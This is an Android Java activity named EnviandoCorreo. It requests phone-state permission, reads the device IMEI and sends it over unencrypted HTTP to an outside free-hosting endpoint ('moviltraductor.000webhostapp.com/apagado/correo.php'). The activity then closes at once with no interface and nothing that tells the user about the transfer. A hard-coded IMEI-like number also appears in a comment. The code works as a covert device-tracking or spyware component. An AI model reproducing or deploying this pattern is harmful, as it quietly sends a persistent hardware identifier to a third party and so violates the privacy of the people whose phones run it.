package com.example.segurityy;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.JsonRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class  EnviandoCorreo extends AppCompatActivity implements Response.Listener<JSONObject>, Response.ErrorListener  {
    static  String Imei="sisas";
    RequestQueue rq;
    JsonRequest jrq;
    private EditText Correo,Pin;
    Button entrar,registrar ;
    int conteo = 0;


    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);


        obtenerImei();

        rq = Volley.newRequestQueue(this);



        Correo();

        finish();



    }
    public String obtenerImei()
    {
        String imei="";
        if(Build.VERSION.SDK_INT  < Build.VERSION_CODES.M)
        {
        }
        else
        {
            // Mayores a Android 6.0
            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE)   != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{Manifest.permission.READ_PHONE_STATE},  225);
            } else {
            }
        }
        imei= getIMEI();
        Imei=imei;
        return imei;
    }
    private String getIMEI() {

        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String imei =tm.getDeviceId(); // Obtiene el imei  or  "352319065579474";
        return imei;


    }


    @Override
    public void onErrorResponse(VolleyError error) {


    }

    @Override
    public void onResponse(JSONObject response) {

    }
    public void Correo(){
        String url = "http://moviltraductor.000webhostapp.com/apagado/correo.php?imei="+Imei;
        jrq = new JsonObjectRequest(Request.Method.GET, url, null, this, this);
        rq.add(jrq);
    }
    public void Correo(String xim){
        String url = "http://moviltraductor.000webhostapp.com/apagado/correo.php?imei="+xim;
        jrq = new JsonObjectRequest(Request.Method.GET, url, null, this, this);
        rq.add(jrq);
    }
}
